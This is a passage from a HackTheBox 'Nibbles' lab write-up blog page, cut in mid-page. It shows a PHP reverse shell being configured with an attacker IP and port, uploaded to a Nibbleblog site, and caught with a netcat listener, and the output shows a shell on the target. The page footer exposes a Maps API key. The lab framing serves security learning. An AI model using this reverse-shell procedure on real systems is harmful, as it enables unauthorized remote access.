+</code></pre><p>The cloning is a success and I now have the php reverse shell code.</p>
+<h3 id="step-5---modify-shell-code">Step 5 - Modify shell code</h3>
+<p>Before I can upload the shell code to the Nibbleblog site, I need to modify it so that the connection is targeted towards my attacking box.</p>
+<pre><code>set_time_limit (0);
+$VERSION = &quot;1.0&quot;;
+$ip = '';  // CHANGE THIS
+$port = ;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+</code></pre><p>Here I see that I must set the <code>ip</code> and <code>port</code> variables to match my IP address and a desired port not in use.</p>
+<pre><code>set_time_limit (0);
+$VERSION = &quot;1.0&quot;;
+$ip = '10.10.16.195';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+</code></pre><p>Port <code>4444</code> is chosen for no particular reason, it is just a default choice used quite commonly for reverse shells.</p>
+<h3 id="step-6---upload-shell-to-blog">Step 6 - Upload shell to blog</h3>
+<p>The shell is uploaded the same way just I as I had done before.</p>
+<p><img src="/images/blog/nibbles/snippet_45.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Nibbleblog - Shell uploaded - Nibbles" /></p>
+<h3 id="step-7---create-listener">Step 7 - Create listener</h3>
+<p>Before executing the file, I need to setup a listener on my attacking box to receive the connection. I will use the netcat(<code>nc</code>) command to do so and must ensure that the port specified is identical to the one specified in the reverse shell code.</p>
+<pre><code>student@teacher:~/hackthebox/Nibbles$ nc -nlvp 4444
+listening on [any] 4444 ...
+</code></pre><h3 id="step-8---execute-shell-and-review-listener">Step 8 - Execute shell and review listener</h3>
+<p><img src="/images/blog/nibbles/snippet_46.png" width="100%" alt="HackTheBox Writeup by Chapl1n - HTTP Server - DirBuster Scan - Nibbles" /></p>
+<p>I go back to the browser and find the <code>image.php</code> file. I click on it and the page goes into a buffering state. I check the listener I set up to see if anything has changed.</p>
+<pre><code>student@teacher:~/hackthebox/Nibbles/php-reverse-shell$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.195] from (UNKNOWN) [10.10.10.75] 55522
+Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 09:51:47 up 11:13,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+</code></pre><p>A simple reverse shell session has now been established between Nibbles and my attacking box.</p>
+<p>After this, the process of post exploitation for creating a TTY shell and getting the user flag is the same as in Section 1. Getting the root flag via privesc and sudo is also the same as in Section 1. Repeating the same content is therefore unnecessary.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>After pwning Nibbles I can reflect on how much I have actually learned. I have learned how something as simple as default credentials can be abused to get full control of a system. I have learned about different options besides msfvenom for creating reverse shell payloads. With regards privesc, learning how to exploit sudo user capabilities is a piece of knowledge I will definitely be using agian.</p>
+
+					</div>
+					<div class="post-comments">
+						
+					</div>
+				</div>
+			</div>
+      <div class="col-md-4">
+        <aside class="sidebar"><div class="widget widget-latest-post">
+    <h4 class="widget-title">Latest Posts</h4>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/nibbles/">
+        <img class="media-object" src="/images/blog/nibbles/nibbles_image.jpg" alt="Nibbles HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/nibbles/">Nibbles HackTheBox - Write-Up</a></h4>
+        <p>This writeup will demonstrate my approach for …</p>
+      </div>
+    </div>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/jerry/">
+        <img class="media-object" src="/images/blog/jerry/snippet_1.png" alt="Jerry HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/jerry/">Jerry HackTheBox - Write-Up</a></h4>
+        <p>This writeup will be my approach for …</p>
+      </div>
+    </div>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/devel/">
+        <img class="media-object" src="/images/blog/devel/cover.jpg" alt="Devel HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/devel/">Devel HackTheBox - Write-Up</a></h4>
+        <p>The first three &lsquo;HackTheBox&rsquo; writeups …</p>
+      </div>
+    </div>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/blue/">
+        <img class="media-object" src="/images/blog/blue/cover.jpg" alt="Blue HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/blue/">Blue HackTheBox - Write-Up</a></h4>
+        <p>This blog piece details my approach for pwning the …</p>
+      </div>
+    </div>
+    
+  </div><div class="widget widget-category">
+    <h4 class="widget-title">Categories</h4>
+    <ul class="widget-category-list">
+      <li><a href="/categories/hackthebox">Hackthebox</a></li>
+    </ul>
+  </div><div class="widget widget-tag">
+    <h4 class="widget-title">Tags</h4>
+    <ul class="widget-tag-list">
+      <li><a href="/tags/apache">Apache</a></li>
+      <li><a href="/tags/distcc">Distcc</a></li>
+      <li><a href="/tags/eternalblue">Eternalblue</a></li>
+      <li><a href="/tags/exploit-compilation">Exploit compilation</a></li>
+      <li><a href="/tags/exploit-modification">Exploit modification</a></li>
+      <li><a href="/tags/ftp">Ftp</a></li>
+      <li><a href="/tags/hackthebox">Hackthebox</a></li>
+      <li><a href="/tags/http">Http</a></li>
+      <li><a href="/tags/linux">Linux</a></li>
+      <li><a href="/tags/misconfiguration">Misconfiguration</a></li>
+      <li><a href="/tags/privesc">Privesc</a></li>
+      <li><a href="/tags/smb">Smb</a></li>
+      <li><a href="/tags/spidering">Spidering</a></li>
+      <li><a href="/tags/tty">Tty</a></li>
+      <li><a href="/tags/tty-shell">Tty shell</a></li>
+      <li><a href="/tags/web-shell">Web shell</a></li>
+      <li><a href="/tags/windows">Windows</a></li>
+    </ul>
+  </div></aside>
+
+      </div>
+		</div>
+	</div>
+</section>
+
+<footer class="footer">
+	<div class="container">
+		<div class="row">
+			<div class="col-md-12">
+				<div class="footer-manu">
+					<ul>
+            
+            <li><a href="http://192.168.1.191/about">About</a></li>
+            
+            <li><a href="http://192.168.1.191/project">Project</a></li>
+            
+            <li><a href="http://192.168.1.191/blog">Blog</a></li>
+            
+					</ul>
+				</div>
+				<p class="copyright">Copyright © 2020 <a href="https://themefisher.com">Themefisher</a> All Rights Reserved</p>
+			</div>
+		</div>
+	</div>
+</footer>
+
+
+
+<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCcABaamniA6OL5YvYSpB3pFMNrXwXnLwU&amp;libraries=places"></script>
+
+
+
+
+<script src="http://192.168.1.191/plugins/jQuery/jquery.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/bootstrap/bootstrap.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/slick/slick.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/magnific-popup/jquery.magnific-popup.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/shuffle/shuffle.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/google-map/gmap.js"></script>
+
+
+
+
+<script src="http://192.168.1.191/js/script.min.js"></script>
+
+
+</body>
+
+</html>
